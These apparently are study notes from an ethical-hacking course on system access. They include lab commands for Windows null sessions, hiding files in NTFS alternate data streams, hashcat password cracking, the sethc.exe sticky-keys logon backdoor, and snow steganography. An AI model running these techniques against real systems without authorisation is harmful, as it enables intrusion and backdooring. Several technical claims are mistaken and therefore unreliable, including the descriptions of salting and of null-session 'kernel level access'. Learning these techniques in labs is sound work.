# Introduction to System Hacking

Until now, we've only been gathering and documenting information. We haven't yet changed the integrity of the target system. This starts by gaining access. Let's cover a few high-level ideas about this concept.

1.  Gain access

    -   eavesdropping

    -   brute force / dictionary

    -   defaults

2.  escalate privileges

    -   exploits

    -   password cracking

    -   horizontal / vertical escalation

        -   horizontal is group 'a' to group 'b'

        -   veritical is changing permissions

3.  execute applications

    -   Trojan / spyware

    -   keyloggers

        -   hardware  or software?

        -   backdoors

4.  hiding tools

    -   root kits

    -   ads

    -   steganography

5.  Covering tracks

    -   logs

        -   log file analysis MUST be mastered

        -   the difference between jail and home

        -   clear tracks

**_note: When it comes to Microsoft systems, you must know EVERYTHING about authentication. You must master these tools to be able to supersede the skills of the sys admin and gain access to the system. As most systems are Microsoft, it will be crucial to learn everything you can about Windows._**

6.  Passwords

    -   passive online

        -   wire sniffing

        -   MiTM

        -   replay

        -   active online

        -   hash injection

        -   trojan-spyware

        -   guessing

        -   phishing

        -   offline

        -   hashes

        -   distributed systems (multiple machines, like slaves)

        -   rainbow tables

    -   non-electronic

        -   shoulder surfing

        -   social engineering

        -   dumpster diving

7.  Root kits

    -   firmware

    -   hypervisor

    -   kernel

    -   applications

    -   library

    -   boot loader

8.  Countermeasures

    -   Salting

        -   adds characters to the end and beginning of a hash signature to make the hash longer and thus harder to crack with a brute force or dictionary attack

        -   extremely effective

        -   most systems don't use

    -   anti root kits

    -   proper proactive, preventative training

    -   system hardening

        -   take away penetration testers options

            -   monitor accounts for privilege escalation

            -   monitor software on hard drives

            -   no ability to eavesdrop

            -   no ability to brute force

            -   constant log file analysis

            -   look for hidden stuff to detect and correct by digging around the network

    -   STIG (standard technical implementation guidelines)

    -   common sense

9.  Tools

#### `NetUse`(Windows): Tool for mapping drives. For our purposes `net use` (which is the syntax for cli) can take advantage of a "null session" exploit. This takes advantage of a flaw in the windows OS.

In DOS terminal:

```bash
>net use \\ip.address.of.server\IPC$ /u:"" ""
```

What we've done is reached out from the client to the windows server and given ourselves kernel level access. By using `netuse` and connecting to the IP with the `IPC$` with no username or password (`/u:"" ""`), we've tricked the computer into answering like an administrator. The destination doesn't care if we're a computer or a human, and gives us kernel level access. If it works, we now have access to all sorts of detailed information, and tools that didn't work previously will work with admin/os/kernel level privileges.

This method is fairly easy to fix by changing a few settings; most system administrators these days know about and have already fixed this.

Basics(_VERY_) of OS architecture for the purposes of understanding `net use`:

-   Each operating system has a kernel mode and a user mode.

-   kernel makes OS stable

-   allows user to interact with it

-   simulates the environment the user is interacting with

    -   administrator isn't the most powerful access on the computer

    -   prevention mechanism for users (can't _completely_ nuke the system)

#### `smbclient` (linux): The linux equivalent of creating a null session.

```bash
smbclient -I 192.168.56.111 -L debian.server -N -U ## Check the help file for proper syntax!!
```

Which, if our debian server settings are correct, should return:

```bash
Connection to 192.168.56.111 failed (Error NT_STATUS_CONNECTION_REFUSED)
```

A more exploitable system would return more information, but since our server security is pretty locked up so far, the way we know the command itself is working is the `NT_CONNECTION_REFUSED` part. It's telling us that the Debian server is denying our request to create a null session. Dis good.

If you got `Anonymous login successful`, we've succeeded in creating a null session.

#### Alternative Data Streams (Windows)

Let's do an exercise to demonstrate this. In command prompt:

```bash
cd \Users\username\
mkdir yourname
cd yourname
dir ## this will show the directory with no files in it

## Now, let's add a text file with some arbitrary content.

notepad.exe seeme.txt

## This will open up notepad, asking you to create a new file. Click 'yes', and start typing away!
## Save the file with ctrl + s, and close it with alt + f4

dir ## should return the contents of the current directory with the new `seeme.txt` file included.

## now that we have this "carrier" file, we're going to append a file to it or fork information through this file into another location. This allows us to hide information on any file system formatted with NTFS.

type seeme.txt ## this should show the text inside the file right in the command prompt.

notepad.exe seeme.txt:hidden.txt ## notepad will again ask you to create a new file. this file will contain the secret information. Enter new different arbitrary text, then ctrl + s to save and alt + f4 to close.

## let's check out the directory for the new 'hidden.txt' file:

dir ## only the 'seeme.txt' file should show, not the 'hidden.txt' file. *poof*

## Let's see if we can find it:

type seeme.txt:hidden.txt ## should return:
The filename, directory name, or volume label syntax is incorrect.

## So it's not recognizing that the file exists. Let's play with some options and see if we can find it.
## remember this file doesn't really contain hidden information, this is a file with another file forked through it by naming convention to another location. The parent file doesn't care about the file that is attached to it.
## Only if we know and call upon the secret location can we retrieve the contents of 'hidden.txt':

notepad seeme.txt:hidden.txt ## should open up your 'hidden.txt' file with all its precious infos.
```

As soon as this file is removed from the partition, the alt data stream gets dropped. There are tools for detecting ADSes, and when doing a full system scan, you may come across some defaults. Note that not all ADSes are malicious.

#### `hashcat` (Kali):

`hashcat` is a cli for cracking passwords via bruteforce or dictionary attacks. Let's open up our Kali distro.

**I also installed hashcat using homebrew on the Mac side, but the commands are essentially the same**

Let's open up the help file (like always). `hashcat -h`...

WHOA that's an exhaustive list! Let's break it down a little bit.

`-a` specifies attack mode. We're going to be using "Straight", so `-a 0`.

The first option you need to specify is `-m`. This signifies the hash type. It is referenced with a number, which can be found under the hash type section of the help file. We're using `md5` for this exercise, so we'll be putting `-m 0` for the hash type.

So far, our command should look like this:

```bash
hashcat -a 0 -m 0
```

Now, we need to specify the hash file we're trying to crack, the word list we're going to be running against it, and the rules (`-r`) we want `hashcat` to follow. I will be using the "rockyou" wordlist against a list of `md5` hashed passwords, using some nsa rules I picked up online. Now my command looks like this:

```bash
hashcat -a 0 -m 0 ./path/to/hash/file.txt ./path/to/wordlist.txt -r ./path/to/rules.rule ## could put `>> /path/to/file.txt` afterwards to print output for documentation.
```

I fired off the command and cracked 23.43% of the password list in 14 seconds. This exercise didn't require any special GPU to crack either because, a.) hashcat now works fairly well with CPUs instead of GPUs, and b.) the passwords were encrypted with `md5`.

As for documentation, you could either copypasta from the terminal or add `>>` followed by the `/path/to/report.txt`. As long as the information is taken down, it doesn't particularly matter which method you use.

#### `sethC`

`sethC` is a tool used for getting access to a system without logging on.

Every windows system has a native program called `sethC` in the system32 directory. It gets access to things like sticky keys when logging on. To take advantage of this, we can copy the original `sethC` file and name it something else. At the same time, we'll be replacing it with our own program, now named `sethC`. Now if you hit the sticky keys, this program is now called upon instead of the real `setchC`.
Let's try it out.

```bash
cd c:\windows\system32
copy sethc.exe sethc.exe.bak2
	1 file(s) copied.
## let's trying something funky:

copy cmd.exe sethc.exe
Overwrite sethc.exe? (Yes/No/All): y
	1 file(s) copied.
```

What we've done is named the command prompt `sethc`, so whenever `sethc` is called upon, the command prompt is opened. Now we have administrative access to the system without logging on.

Reboot windows, and when you reach the logon screen, hit shift several times until a prompt appears saying "Do you want to turn on sticky keys?". We say yes and we're in.

#### `snow`(Windows)

Snow is a whitespace steganography tool. In order to illustrate this, what we need is 1.) a carrier file and 2.) the snow program. So if we have `snow` installed in the `\system32\` directory, we can do the following:

```bash
notepad snow.txt ## this will be our carrier file. notepad will open, we add our arbitrary text, ctrl + s to save, alt +f4 to close the file. I had "whattup in the homie zone" written inside.

type snow.txt
## the text you entered from `snow.txt` appears in command prompt here
"whattup in the homie zone"

## now we will add hidden content to the file.

snow -C -m "Dis be the hidden informational booty" -p "password" snow.txt snow2.txt
```

A breakdown of the command:

`-C` creates the carrier file, `-m` creates the hidden message, `-p` assigns the password for the file, then we point the command at the original carrier file, `snow.txt` and give it a new destination for the stego'd file, in this case `snow2.txt`.

I received a response like this:

```bash
Compressed by 43.88%
Message exceeded available space by approximately 1306.67%
An extra 7 lines were added.
```

Now let's see what's in that file:

```bash
type snow2.txt ## returns:
"whattup in the homie zone"






C:\>
```

So we have the same information from the carrier file. Let's try to extract the hidden information from the file.

```bash
snow -C -p "password" snow2.txt
## returns:
"Dis be the hidden informational booty"
## only with the correct password can the message be retrieved
## now we can test out if the password works by changing the password:
snow -C -p "password1234" snow.txt
## you'll get a lot of cyphered text (gobbledy-gook) back. This is a dead giveaway that a file has been stego'd. Each time we change the password and enter it incorrectly, we get more gobbledy-gook.
```

#### `md5sum`, `md5`, `md5deep` (multiple OS)

Let's apply another tool to our files that we stego'd with `snow`.  We'll be using `md5sum` check the integrity of our files.

```bash
md5sum snow.txt
## the message digest of 'snow.txt' is displayed here
md5sum snow2.txt
## the hash will be different, because they are different files
type snow2.txt
"whattup in the homie zone"





C:\>
## now we'll try 'snow.txt'
type snow.txt
"whattup in the homie zone"
C:\>
```

A few things of note here. These files both appear to have the exact same content, but produce different hashes when `md5` is applied to it. This proves to us that the integrity of our file has been changed.

Some other hashing alogrithms:

-   `tiger`

-   `SHA`

-   `whirlpool`
